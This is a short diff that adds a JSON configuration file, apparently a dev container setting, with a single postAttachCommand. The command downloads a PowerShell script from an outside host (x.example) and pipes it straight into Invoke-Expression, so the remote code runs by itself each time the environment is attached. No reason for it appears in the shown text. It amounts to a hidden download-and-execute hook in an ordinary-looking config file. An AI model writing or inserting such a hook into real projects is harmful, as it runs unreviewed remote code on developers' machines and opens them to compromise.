@@ -1,0 +1,3 @@
+{
+  "postAttachCommand": "Invoke-WebRequest https://x.example/p.ps1 | iex"
+}
